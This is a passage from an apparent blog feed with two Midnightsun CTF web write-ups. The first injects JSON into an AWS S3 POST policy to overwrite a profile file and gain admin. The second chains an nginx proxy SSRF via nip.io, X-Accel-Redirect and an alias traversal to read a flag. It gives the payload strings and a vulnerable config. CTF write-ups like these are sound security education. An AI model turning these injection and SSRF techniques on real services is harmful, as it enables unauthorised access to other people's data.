      <content type="html" xml:base="http://localhost:4000/2019/04/20/midnisghtsunctf-cloudb/">&lt;p&gt;This weekend, my mates of ID-10-T Team and I decided to play the Midnightsun CTF, we had a long time without playing CTFs so it was nice to meet again and solve some challenges.&lt;/p&gt;

&lt;p&gt;The Cloudb challenge, from web cathegory, has the following statement:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;These guys made a DB in the cloud. Hope it's not a rain cloud...

Service:  [http://cloudb-01.play.midnightsunctf.se](http://cloudb-01.play.midnightsunctf.se/)

Author: avlidienbrunn
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;intro&quot;&gt;Intro&lt;/h3&gt;
&lt;p&gt;Another cloud challenge, I love them! This challenge is about reaching &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; privileges on a Cloud data storage platform.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/dreadlocked/ctf-writeups/master/images/cloudb/cloudb_1.png&quot; alt=&quot;cloud1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The platform lets you upload a profile pic by directly posting it to an Amazon AWS S3 bucket. The upload process consists on two different requests:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;A GET to &lt;code class=&quot;highlighter-rouge&quot;&gt;/signature&lt;/code&gt; path, passing an ACL and a HMAC sign as parameters. This request returns a base64 encoded JSON, with an AWS S3 bucket POST policy:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/dreadlocked/ctf-writeups/master/images/cloudb/cloudb_3.png&quot; alt=&quot;cloud1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The decoded base64:&lt;/p&gt;
&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;expiration&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2019-04-06T14:17:03.000Z&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;conditions&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;content-length-range&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bucket&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cloudb-profilepics&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;acl&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;public-read&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;starts-with&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;$key&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;profilepics/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;A POST request to the Amazon AWS S3 bucket using the amazon standard for this kind of requests, explained here: https://docs.aws.amazon.com/AmazonS3/latest/API/sigv4-post-example.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/dreadlocked/ctf-writeups/master/images/cloudb/cloudb_4.png&quot; alt=&quot;cloud1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Seems like first we are creating a policy, then using this policy to POST our profile pic to the S3 bucket.&lt;/p&gt;

&lt;p&gt;Our profile pic is saved at &lt;code class=&quot;highlighter-rouge&quot;&gt;/profilepics/idiotsctf@idiots.con/ejemplo.jpeg&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Also, the application lets us request our profile information, at &lt;code class=&quot;highlighter-rouge&quot;&gt;/userinfo/idiotsctf@idiots.com/info.json&lt;/code&gt; endpoint, returning the following JSON:&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;profilepic&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/profilepics/idiotsctf@idiots.com/ejemplo.jpeg&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;hmac&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;427881d9d33e2e619047bbaff90205a6c804524405d3574c8f4dfcabee162788&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;idiotsctf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;email&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;idiotsctf@idiots.com&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hmm… that “admin” flag set to &lt;code class=&quot;highlighter-rouge&quot;&gt;false&lt;/code&gt;, seems like we will need to overwrite our &lt;code class=&quot;highlighter-rouge&quot;&gt;/userinfo/idiotsctf@idiots.com/info.json&lt;/code&gt; profile file and set the admin flag to true.&lt;/p&gt;

&lt;h3 id=&quot;understanding-a-bit-how-aws-s3-post-policy-works&quot;&gt;Understanding a bit how AWS S3 POST Policy works.&lt;/h3&gt;
&lt;p&gt;Before continuing, it’s necesary to understand a bit how AWS S3 policy works. Amazon let developers upload content via POST requests to a S3 bucket. To do this, the developer needs to define a policy parameter for each user upload, this is what the &lt;code class=&quot;highlighter-rouge&quot;&gt;GET /signature&lt;/code&gt; request does.&lt;/p&gt;

&lt;p&gt;That policy controls how much time the client-side has to upload the content, where it’s going to be uploaded, the content type, which bucket is allowed etc.&lt;/p&gt;

&lt;p&gt;The above JSON policy (on Intro), tells:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Your POST upload permission ends at &lt;code class=&quot;highlighter-rouge&quot;&gt;2019-04-06T14:17:03.000Z&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;You can upload files between 1 and 10000 bytes length.&lt;/li&gt;
  &lt;li&gt;You are allowed to upload it to cloudb-profilepics bucket.&lt;/li&gt;
  &lt;li&gt;Your ACL will be public-read, so everyone can read the content you upload.&lt;/li&gt;
  &lt;li&gt;And the S3 bucket key where you upload the content, must start with &lt;code class=&quot;highlighter-rouge&quot;&gt;profilepics/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;the-magic-of-team-work&quot;&gt;The magic of team work.&lt;/h3&gt;
&lt;p&gt;Phiber, from int3pids is one of our ID10Ts team colleague, he was the first who started working on this challenge. When I woke up, he had some work done over the challenge as he realized &lt;strong&gt;how to inject characters on the S3 policy&lt;/strong&gt; generated by the &lt;code class=&quot;highlighter-rouge&quot;&gt;/signature&lt;/code&gt; controller.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;First he found the secret key which where used to create the sign on the &lt;code class=&quot;highlighter-rouge&quot;&gt;hmac&lt;/code&gt; parameter. That signed the &lt;code class=&quot;highlighter-rouge&quot;&gt;acl&lt;/code&gt; parameter. The key was &lt;code class=&quot;highlighter-rouge&quot;&gt;[object Object]&lt;/code&gt;, literally.&lt;/li&gt;
  &lt;li&gt;Second, he was able to inject JSON strings on the &lt;code class=&quot;highlighter-rouge&quot;&gt;acl&lt;/code&gt; parameter. Let’s explain it:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;A “common” query, could be &lt;code class=&quot;highlighter-rouge&quot;&gt;/signature?hmac=&amp;lt;hmac&amp;gt;&amp;amp;acl=public-read&lt;/code&gt;, this returns the above mentioned JSON (on Intro). Now, if we inject some strings, like this: &lt;code class=&quot;highlighter-rouge&quot;&gt;/signature?hmac=&amp;lt;hmac&amp;gt;&amp;amp;acl=public-read'} test&lt;/code&gt;, the base64 encoded policy acl looks like this:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;... {'acl': 'public-read'}, test ...&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;We can inject things on the policy!!!&lt;/p&gt;

&lt;h3 id=&quot;looking-for-the-buckets&quot;&gt;Looking for the buckets.&lt;/h3&gt;
&lt;p&gt;Now we know that we can tamper the policy, we know we need to overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;/userinfo/idiotsctf@idiots.com/info.json&lt;/code&gt; file to obtain admin privileges, but we don’t know the S3 bucket name where the user information is being stored.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Patatas in action:&lt;/strong&gt;
Our team mate @HackingPatatas has an incredible ability to try random things and make it work. He tried &lt;code class=&quot;highlighter-rouge&quot;&gt;cloud-users.s3.amazonaws.com&lt;/code&gt; and it was a valid bucket. So it’s highly probable that the &lt;code class=&quot;highlighter-rouge&quot;&gt;info.json&lt;/code&gt;file is being stored on that bucket.&lt;/p&gt;

&lt;h3 id=&quot;bypassing-policy-restrictions&quot;&gt;Bypassing policy restrictions.&lt;/h3&gt;
&lt;p&gt;The policy tells us we can’t just query &lt;code class=&quot;highlighter-rouge&quot;&gt;cloud-users&lt;/code&gt; bucket, as the buckets and the keys of the buckets we are allowed to query, are well defined on the policy. We need to figure out how to invalidate those restrictions and add our own.&lt;/p&gt;

&lt;p&gt;If we try to POST something like this :&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST https://cloudb-users.s3.amazonaws.com/

{
&quot;key&quot;:&quot;users/idiotsctf@idiots.com/info.json&quot;,
...
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The AWS S3 server will fail as the policy only allows &lt;code class=&quot;highlighter-rouge&quot;&gt;cloud-profilepics&lt;/code&gt; as bucket and &lt;code class=&quot;highlighter-rouge&quot;&gt;profilepics/&lt;/code&gt; as bucket key path.&lt;/p&gt;

&lt;p&gt;A way to bypass, at least the &lt;code class=&quot;highlighter-rouge&quot;&gt;bucket&lt;/code&gt; restriction is adding another &lt;code class=&quot;highlighter-rouge&quot;&gt;conditions&lt;/code&gt; JSON block. In JSON if the same key appears many times on the same level, the last is going to be the valid one. In this case, as the &lt;code class=&quot;highlighter-rouge&quot;&gt;conditions&lt;/code&gt; directive appears before the user controlled &lt;code class=&quot;highlighter-rouge&quot;&gt;acl&lt;/code&gt; injectable parameter, we can inject something like this to invalidate the previous conditions:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public-read'}], 
'conditions': [
['starts-with', '$key', 'users/'],
{'bucket':'cloudb-users'},
{'acl':'public-read
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;See how we are closing the previous &lt;code class=&quot;highlighter-rouge&quot;&gt;condition&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;]&lt;/code&gt;, and opening a new one, with the &lt;code class=&quot;highlighter-rouge&quot;&gt;cloud-users&lt;/code&gt; as allowed bucket. This returned the error &lt;code class=&quot;highlighter-rouge&quot;&gt;Invalid according to Policy: Policy Condition failed: [&quot;starts-with&quot;, &quot;$key&quot;, &quot;profilepics/&quot;]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Hmmm, our &lt;code class=&quot;highlighter-rouge&quot;&gt;starts-with&lt;/code&gt; directive is being overwritted by the original one, which is after our injection point.&lt;/p&gt;

&lt;h3 id=&quot;the-magic-of-the-patata-again&quot;&gt;The magic of the patata… again.&lt;/h3&gt;
&lt;p&gt;We need to find a way to invalidate the second &lt;code class=&quot;highlighter-rouge&quot;&gt;starts-with: profilepics/&lt;/code&gt; directive, we can do this by creating a new JSON block at the end of our injection, like this:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;(our injection) ... ], 'new-block': [{'acl': 'public-read&lt;/code&gt;, so the second &lt;code class=&quot;highlighter-rouge&quot;&gt;starts-with&lt;/code&gt; is not going to be inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;conditions&lt;/code&gt; block anymore. BUUUUUUT, we just can’t declare blocks with  names other than &lt;code class=&quot;highlighter-rouge&quot;&gt;conditions&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;expiration&lt;/code&gt; or we get an error like this &lt;code class=&quot;highlighter-rouge&quot;&gt;Invalid Policy: Unexpected: 'new-block'&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This is terrible, we can only use two directives, the first one, &lt;code class=&quot;highlighter-rouge&quot;&gt;conditions&lt;/code&gt;, will overwrite our injected condition again, so we do not win anything, and the second, &lt;code class=&quot;highlighter-rouge&quot;&gt;expiration&lt;/code&gt;, only supports a single string as value.&lt;/p&gt;

&lt;p&gt;After a bit of try, error, try, error, our team mate @HackingPatatas, made it again. He wrotes on team’s chat:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DarkPatatas, [6 abr 2019 15:29:10]:
ostia.. un sec (the hell... wait a second...)

JAJASDJASJASODJASOJDAOSJDAOSJdas (laughts in spanish)

ME MATO (I'll kill myself)

lo tengo (I got it)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;What? How?&lt;/p&gt;

&lt;p&gt;He just fucking tested &lt;code class=&quot;highlighter-rouge&quot;&gt;Conditions&lt;/code&gt; instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;conditions&lt;/code&gt;, and Amazon take it as a valid Policy key, but not applying it as a condition for the policy, so we successfully bypassed al the restrictions.&lt;/p&gt;

&lt;p&gt;The next step is do the same but this time, uploading an &lt;code class=&quot;highlighter-rouge&quot;&gt;info.json&lt;/code&gt; to /users/idiotsctf@idiots.com/info.json, with the “admin” flag set to &lt;code class=&quot;highlighter-rouge&quot;&gt;true&lt;/code&gt;. And…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/dreadlocked/ctf-writeups/master/images/cloudb/cloudb_final.png&quot; alt=&quot;cloud1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ding ding ding!!! We are admin!!! And, of course, now we can go to &lt;code class=&quot;highlighter-rouge&quot;&gt;/admin&lt;/code&gt; endpoint, authenticate and read the flag.&lt;/p&gt;

&lt;h3 id=&quot;final-thoughts&quot;&gt;Final thoughts&lt;/h3&gt;

&lt;p&gt;What the hell Amazon?&lt;/p&gt;

&lt;p&gt;Thanks to all the team, specially @phiber_int3 and @HackingPatatas to help a lot on solving this challenge. It was really funny and challenging!&lt;/p&gt;</content>

      
      
      
      
      

      

      
        <category term="web" />
      
        <category term="ctf" />
      
        <category term="aws" />
      

      

      
        <summary type="html">This weekend, my mates of ID-10-T Team and I decided to play the Midnightsun CTF, we had a long time without playing CTFs so it was nice to meet again and solve some challenges.</summary>
      

      
      
    </entry>
  
  
  
    <entry>
      
      <title type="html">[CTF Write-up] Midnightsun CTF Quals- Bigspin (web. mid)</title>
      
      
      <link href="http://localhost:4000/2019/04/20/midnightsunctf-bigspin/" rel="alternate" type="text/html" title="[CTF Write-up] Midnightsun CTF Quals- Bigspin (web. mid)" />
      
      <published>2019-04-20T13:00:00+02:00</published>
      <updated>2019-04-20T13:00:00+02:00</updated>
      <id>http://localhost:4000/2019/04/20/midnightsunctf-bigspin</id>
      <content type="html" xml:base="http://localhost:4000/2019/04/20/midnightsunctf-bigspin/">&lt;p&gt;This weekend, my mates of ID-10-T Team and I decided to play the Midnightsun CTF, we had a long time without playing CTFs so it was nice to meet again and solve some challenges.&lt;/p&gt;

&lt;p&gt;The Bigspin challenge, from web cathegory, has the following statement:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;This app got hacked due to admin and uberadmin directories being open. Was just about to wget -r it, but then they fixed it :( Can you help me get the files again?

Service: http://bigspin-01.play.midnightsunctf.se:3123

Author: avlidienbrunn
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;intro&quot;&gt;Intro&lt;/h3&gt;
&lt;p&gt;First is first, let’s see what this application looks like on it’s root path:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
    What's it gonna be? Are you an 
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/uberadmin/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;uberadmin&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;, 
    an &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/admin/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;admin&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;, 
    a &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/user/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;user&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;, 
    or (most likely) just a &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/pleb/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;pleb&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;?
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Ok so we have four kind of “privilege” levels, and probably we need to reach /uberadmin/ path, cool but, How? Trying to just navigate http://bigspin-01.play.midnightsunctf.se:3123/uberadmin/ shows us an Nginx 403 default error, the same occurs with /user, otherwise, /admin shows a 404. How about /pleb?.&lt;/p&gt;

&lt;p&gt;/pleb path returns a 200 OK with the HTML body of http://www.example.com/.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/dreadlocked/ctf-writeups/master/images/bigspin/bigspin_1.png&quot; alt=&quot;pleb1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Usually, when I face Nginx servers on CTFs and in some real-world cases, I instantly think about Nginx-alias path traversal vulenerabilities, so I tested /pleb../ and.. the server returns 502 Bad Gateway error.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/dreadlocked/ctf-writeups/master/images/bigspin/bigspin_2.png&quot; alt=&quot;pleb2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Wait, what? If not vulnerable, it should return 404, if vulnerable it should return 404 or 200, as we are asking for an existing file or path.&lt;/p&gt;

&lt;h3 id=&quot;13-beating-user-level&quot;&gt;1/3 beating user level.&lt;/h3&gt;
&lt;p&gt;Now we have an unexpected behaviour, when the /pleb/ string is present on the path, the server returns the HTML body of example.com, this could be an indicative of &lt;code class=&quot;highlighter-rouge&quot;&gt;proxy_pass&lt;/code&gt; Nginx directive acting as a reverse proxy to www.example.com, but if we add any characters to the end of /pleb, like /plebidiot, the server returns 502, this means that the server is trying to reach www.example.comidiot, as it can’t reach that domain, it returns 502.&lt;/p&gt;

&lt;p&gt;Well, so now we know that some kind of SSRF can be done here, my man @dj.thd told us, what if you use a dynamically resolver dns server based on level1 subdomain, and ignoring  other low-level subdomains? Like this www.example.com.127.0.0.1.idiots.com -&amp;gt; 127.0.0.1. Great idea, fortunately for us, there’s a service that does exactly this, nip.io.&lt;/p&gt;

&lt;p&gt;So, let’s see what happens, when we try to reach /pleb.127.0.0.1.nip.io/user/,&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/dreadlocked/ctf-writeups/master/images/bigspin/bigspin_3.png&quot; alt=&quot;pleb3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ding ding ding!!! Win!!! We reached /users/ folder, with shows us an Index folder where we can see an “nginx.cönf “ file. To read it, my man @patatasfritas used double URL encoding, as Nginx is not that friendly when trying to read files with special characters.&lt;/p&gt;

&lt;p&gt;The nginx.conf file contained the following directives:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # omited for readability

http {

    # omited for readability

    server {
        listen 80;

        location / {
            root /var/www/html/public;
            try_files $uri $uri/index.html $uri/ =404;
        }

        location /user {
            allow 127.0.0.1;
            deny all;
            autoindex on;
            root /var/www/html/;
        }

        location /admin {
            internal;
            autoindex on;
            alias /var/www/html/admin/;
        }

        location /uberadmin {
            allow 0.13.3.7;
            deny all;
            autoindex on;
            alias /var/www/html/uberadmin/;
        }

        location ~ /pleb([/a-zA-Z0-9.:%]+) {
            proxy_pass   http://example.com$1;
        }

        access_log /dev/stdout;
        error_log /dev/stdout;
    }

}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Well, see that? /user path can only be reached on localhost, we aimed that using the location /pleb SSRF, pointing a user controlled domain to 127.0.0.1 using nip.io, a classic SSRF tip.&lt;/p&gt;

&lt;h3 id=&quot;23-beating-admin-level&quot;&gt;2/3 beating admin level.&lt;/h3&gt;
&lt;p&gt;Now we need to reach &lt;code class=&quot;highlighter-rouge&quot;&gt;/admin&lt;/code&gt;, it’s configuration is the same, but this time it has an &lt;code class=&quot;highlighter-rouge&quot;&gt;internal&lt;/code&gt; nginx directive, what means internal? Let’s Google a bit:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Specifies that a given location can only be used for internal requests. 
For external requests, the client error 404 (Not Found) is returned. Internal requests are the following:

-   requests redirected by the error_page, index, random_index, and try_files directives;
-   requests redirected by the “X-Accel-Redirect” response header field from an upstream server;
-   subrequests formed by the include virtual command of the  ngx_http_ssi_module  module, by the ngx_http_addition_module module directives,
and by auth_request and  mirror directives; requests changed by the rewrite directive.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ok, while reading this snippet of documentation, the &lt;code class=&quot;highlighter-rouge&quot;&gt;X-Accel-Redirect&lt;/code&gt; header shines among so many directives. What if we try to do the same as the previous step, but this time resolving to a user controlled server, which always redirects with &lt;code class=&quot;highlighter-rouge&quot;&gt;X-Accel-Redirect&lt;/code&gt;pointing to &lt;code class=&quot;highlighter-rouge&quot;&gt;/admin&lt;/code&gt;? We can use nip.io again to do this.&lt;/p&gt;

&lt;p&gt;First, we need to setup a simple python web server and configure it to always redirect, simple. Then, we try to reach /pleb.X.X.X.X.nip.io, if everything works, the admin folder should be returned and…&lt;/p&gt;

&lt;p&gt;Ding ding ding!!! Win!!! Another win, now we can reach /admin location.&lt;/p&gt;

&lt;h3 id=&quot;33-beating-uberadmin-level&quot;&gt;3/3 beating uberadmin level.&lt;/h3&gt;
&lt;p&gt;This level was easy peasy, as when seeing the Nginx configuration file, it highlights the alias traversal on /admin location, so we just need to configure our python server with &lt;code class=&quot;highlighter-rouge&quot;&gt;X-Accel-Redirect: /admin..uberadmin/flag.txt&lt;/code&gt; and…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/dreadlocked/ctf-writeups/master/images/bigspin/bigspin_4.png&quot; alt=&quot;pleb4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Win!!! We got the flag.&lt;/p&gt;

&lt;h3 id=&quot;final-thoughts&quot;&gt;Final thoughts&lt;/h3&gt;
&lt;p&gt;This challenge was really funny, it’s curious how sensitive an Nginx configuration file is. Thanks to @HackingPatatas and @dj.thd for solving this challenge with me.&lt;/p&gt;

&lt;p&gt;Feel free to ping me if you see any mistake at @_dreadlocked on twitter.&lt;/p&gt;</content>

      
      
      
      
      

      

      
        <category term="web" />
      
        <category term="ctf" />
      
        <category term="nginx" />
      

      

      
        <summary type="html">This weekend, my mates of ID-10-T Team and I decided to play the Midnightsun CTF, we had a long time without playing CTFs so it was nice to meet again and solve some challenges.</summary>
      

      
      
    </entry>
  
  
  
    <entry>
      
      <title type="html">[CTF Write-up] Secadmin El Ninja contrareloj (rev. easy)</title>
      
      
      <link href="http://localhost:4000/2018/10/08/secadmin-reversing-writeup/" rel="alternate" type="text/html" title="[CTF Write-up] Secadmin El Ninja contrareloj (rev. easy)" />
      
